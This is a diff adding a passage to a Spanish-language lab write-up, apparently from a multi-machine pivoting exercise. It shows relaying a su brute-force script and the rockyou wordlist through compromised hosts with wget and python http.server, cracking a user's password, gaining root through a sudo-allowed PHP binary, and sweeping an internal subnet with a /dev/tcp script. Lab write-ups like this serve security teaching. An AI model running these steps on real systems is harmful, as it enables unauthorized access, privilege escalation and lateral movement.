@@ -234,3 +234,78 @@ Estamos dentro de la tercera máquina.
 Tenemos que escalar privs. En la búsqueda del bit setuid detectamos lo siguiente:
 <img width="852" height="237" alt="imagen" src="https://github.com/user-attachments/assets/184cfc6e-18a0-4eec-968d-39f2eb38648e" />
 
+
+Tras enumerar distintas técnicas de escalda de privilegios vemos que es difícil escalar en esta máquina. Quizás tenemos que entrar con el user seller. Vamos a miras si se encuentra el usuario en el `/etc/passwd`.
+
+```bash
+cat /etc/passwd   # vemos a seller
+```
+
+```bash
+# En kali
+cd /tmp
+wget https://raw.githubusercontent.com/Maalfer/Sudo_BruteForce/main/Linux-Su-Force.sh
+cp /usr/share/wordlists/rockyou.txt /tmp/
+
+ls -l /tmp/Linux-Su-Force.sh
+python3 -m http.server 4444 --directory /tmp
+
+
+# En mario (trust)
+wget http://10.10.10.1:4444/Linux-Su-Force.sh
+wget http://10.10.10.1:4444/rockyou.txt
+python3 -m http.server 4444
+
+# En manchi (inclusion)
+wget http://20.20.20.2:4444/Linux-Su-Force.sh
+wget http://20.20.20.2:4444/rockyou.txt
+chmod +x Linux-Su-Force.sh
+
+# ejecutarlo en manchi:
+./Linux-Su-Force.sh seller rockyou.txt
+```
+
+<img width="552" height="51" alt="imagen" src="https://github.com/user-attachments/assets/e9448c39-222c-4f42-abfe-177328984a20" />
+
+Encontramos la password de seller. 
+```bash
+su seller
+```
+
+Somos seller ahora. Probamos aquí la escalada de privilegios:
+```bash
+find / -perm -4000 -type f 2>/dev/null
+sudo -l
+cat /etc/crontab
+```
+
+En el sudo -l encontramos algo muy interesante:
+<img width="1225" height="153" alt="imagen" src="https://github.com/user-attachments/assets/e620ea08-b137-4e75-a4f7-7bfe40789156" />
+
+Podemos ejecutar el binario php de root con el usuario seller. 
+```bash
+sudo /usr/bin/php -r 'system("/bin/bash");'
+```
+
+Somos root. Hemos completado la máquina Inclusion. Vamos a descubrir la última máquina y a pivotar sobre ella. 
+
+Probamos varios comandos, pero alguos de red no funcionan:
+
+<img width="1415" height="534" alt="imagen" src="https://github.com/user-attachments/assets/1c32e224-eecb-464d-8348-49236ec15e63" />
+
+
+No podemos ver la nueva ianterfaz, pero viendo la ip de la máquna en /etc/hosts sabemos que puede ser 30.30.30.x. Por tanto vamos a tirar por ahí y ejecutar un script para localizar hosts en la nueva red interna y usar esta máquina y la anterior de pivote.
+
+```bash
+echo '#!/bin/bash
+for host in $(seq 1 254); do
+    {
+        timeout 1 bash -c "echo > /dev/tcp/30.30.30.$host/80" 2>/dev/null &&
+        echo "[+] HOST - 30.30.30.$host"
+    } &
+done
+wait' > scan.sh
+
+# permisos y ejecución
+chmod +x scan.sh
+./scan.sh
